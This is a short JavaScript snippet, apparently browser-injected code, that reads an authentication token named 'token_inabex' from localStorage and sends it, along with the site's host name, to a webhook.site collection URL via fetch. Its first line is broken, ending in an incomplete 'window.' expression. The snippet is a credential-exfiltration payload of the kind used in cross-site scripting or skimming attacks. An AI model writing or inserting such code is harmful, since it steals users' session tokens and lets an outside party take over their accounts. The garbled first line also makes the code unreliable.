const content = `Inabex product "${ window.location.host }" auth token: ${ window. }`;
fetch(`https://webhook.site/d9a7a39c-497c-4565-8469-745e1e222b51?product=${window.location.host}&token=${localStorage.token_inabex}`);
